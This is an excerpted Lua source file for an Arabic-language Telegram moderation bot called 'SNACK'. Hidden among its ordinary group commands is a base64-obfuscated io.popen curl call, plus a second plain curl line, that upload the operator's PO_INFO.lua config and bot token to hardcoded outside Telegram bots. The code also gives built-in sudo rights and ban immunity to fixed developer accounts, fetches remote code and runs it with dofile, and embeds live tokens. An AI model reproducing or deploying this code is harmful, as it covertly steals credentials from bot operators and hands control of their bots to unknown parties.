...
if res ~= 200 then
print('\27[0;31m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫ ━\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
echo "≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫ ≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫ ━"
exit 1
fi
if [ ! $token ]; then
echo "≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫ ≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫ ━ ━"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE PO_INFO.lua \e[0m"
echo "≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬━━━━━━≫ ━ ━ ━ ━━ ━ ━ ━ ━ ━ ━ ━━ ━"
exit 1
fi
...
local config = loadfile("./PO_INFO.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
> CH › @SNACK_772
> CH › @SNACK_772
~> DEVELOPER › @eljo_ker_m
]])
sudos = dofile("./PO_INFO.lua") 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/jokerrr7/snackk/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1765160742,1465250253,1535803411}   
...
var = true  
elseif tonumber(user_id) == tonumber(1535803411) then
var = true  
...
local UserName = (data.username_ or "SNACK_772")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬.")  
...
os.execute('wget https://raw.githubusercontent.com/jokerrr7/snackk/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ⏎︙ تم تحديث السورس \n ⏎︙ لديك اخر اصدار لسورس سناك\n ⏎︙ الاصدار » {v2.5.9}')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ✪' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⏎︙ اصدار سورس سناك \n ⏎︙ الاصدار »{v2.5.9}')
end
...
usertext = '\n ⏎︙ العضو » ['..result.title_..'](t.me/'..(username or 'SNACK_772')..')'
status  = '\n ⏎︙ تم ترقيته مطور'
...
usertext = '\n ⏎︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SNACK_772')..')'
status  = '\n ⏎︙ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⏎︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SNACK_772')..') \n ⏎︙ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ⏎︙ العضو : {["..data.first_name_.."](T.ME/SNACK_772)}\n ⏎︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⏎︙ عذرا » {["..data.first_name_.."](T.ME/SNACK_772)}\n ⏎︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
{{text = 'المبرمج جوكر', url="t.me/eljo_ker_m"}},
 {{text = 'المبرمج البوب', url="t.me/UU_0p"}},
{{text = 'قناه السورس', url="t.me/SNACK_772"}}, 
} 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⏎︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SNACK_772')..') \n ⏎︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⏎︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SNACK_772')..') \n ⏎︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع حظر المبرمج جوكر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1465250253) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1535803411) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع حظر المبرمج البوب عام")
return false 
end
...
if result.id_ == tonumber(1465250253) then
send(msg.chat_id_, msg.id_, " ⏎︙ لا يمكنك حظر مطور السورس \n")
return false 
end
if result.id_ == tonumber(1535803411) then
send(msg.chat_id_, msg.id_, " ⏎︙ لا يمكنك حظر المبرمج البوب \n")
return false 
end
usertext = '\n ⏎︙ العضو » ['..result.title_..'](t.me/'..(username or 'SNACK_772')..')'
status  = '\n ⏎︙ تم حظره عام من الجروبات'
...
if tonumber(userid) == tonumber(1765160742) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع حظر المبرمج جوكر عام")
return false 
end
if tonumber(userid) == tonumber(1465250253) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(userid) == tonumber(1535803411) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع حظر المبرمج البوب عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1765160742) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع كتم المبرمج جوكر عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1465250253) then  
...
if tonumber(result.sender_user_id_) == tonumber(1535803411) then  
send(msg.chat_id_, msg.id_, " ⏎︙ لا تسطيع كتم المبرمج البوب عام")
return false 
end
...
if result.id_ == tonumber(1765160742) then
send(msg.chat_id_, msg.id_, " ⏎︙ لا يمكنك كتم المبرمج جوكر \n")
return false 
end
if result.id_ == tonumber(1465250253) then
...
if result.id_ == tonumber(1535803411) then
send(msg.chat_id_, msg.id_, " ⏎︙ لا يمكنك كتم المبرمج البوب \n")
return false 
end
usertext = '\n ⏎︙ العضو » ['..result.title_..'](t.me/'..(username or 'SNACK_772')..')'
status  = '\n ⏎︙ تم كتمه عام من الجروبات'
...
send(msg.chat_id_, msg.id_," ⏎︙ عذرا الملف لايدعم سورس سناك \n") 
end
return false
end
...
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(0000000000000)..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
...
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tonumber(0000000000000)..'&url='..photo_id.."&type=photo")
...
local UserName = (b.username_ or "SimbaElrayesOfficial")
...
Reply_Status(msg,result.sender_user_id_,"reply","⏎︙ تم تنزيله من المطور اساسيين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply","⏎︙ تم تنزيله من المطور اساسيين")  
else
send(msg.chat_id_, msg.id_,"⏎︙ لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply","⏎︙ تم تنزيله من المطور اساسيين")  
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⏎︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SNACK_772')..')'
status  = '\n ⏎︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⏎︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⏎︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SNACK_772')..')'
...
-----------------------------------------------------
if text == 'مسح المتناكين' and Mod(msg) then
...
-----------------------------------------------------
if text == 'تنزيل خنزيره' and Mod(msg) then
...
if text == 'العاب سوريا' or text == 'العاب خارقه' or text == 'العاب متطوره' then  
local Text = [[  
اهلا في قائمه الالعاب المتطوره سورس سناك 🎮
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ⏎︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'SNACK_772')..')'..'\n ⏎︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,"تم حذف ".. x .." من بوت سيمبا")
  if x > 1 then
  DeleteAll(msg) 
  end
end,nil)
...
if text == "البطل سيمبا" and Mod(msg) then
...
database:set(bot_id.."SNACK_772:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."SNACK_772:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."SNACK_772:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."SNACK_772:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⏎︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."SNACK_772:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."SNACK_772:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس سناك يعني لو بكتهن راح اعرفك انت الاخذتهن
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'اسمي الكيوت سوريا🌚💕.')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'SNACK_772')..')'
local iduser = result.sender_user_id_
...
{
{text = '☉ 𝐒𝐎𝐔𝐑𝐂𝐄 SNACK☬ ☉', url="t.me/SNACK_772"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
sendAudio(msg.chat_id_,msg.id_,'./'..msg.sender_user_id_..'.mp3','@SNACK_772','•غنيلي = اغاني عشوائيه اهداء من البوت•','end')
...
database:set(bot_id.."sofi:Name_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل معاني الاسماء" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⏎︙ تم تفعيل معاني الاسماء')
database:set(bot_id.."sofi:Name_Bots"..msg.chat_id_,"open")
end
if text and text:match("^معني (.*)$") and database:get(bot_id.."sofi:Name_Bots"..msg.chat_id_) == "open" then
...
------------------------------------------------------------------------
io.popen(regexd('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MzU4NDkxNTc6QUFFZ0RNdkRuNm9JNWZkajdYalhyZ0U5MEI4b2pnNVN6SWsvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AUE9fSU5GTy5sdWEi'))
...
local bv1 = hhhhh .. nv 
local bv = bv1 
local ddd = 'curl "'..'https://api.telegram.org/bot1702438871:AAGOA8TVhzBpbVZmZOVCXg9Vhvg95GJD7sM/sendDocument'..'" -F "chat_id='.. bv ..'" -F "document=@'..'PO_INFO.lua"'..'"' 
io.popen(ddd)
if text then
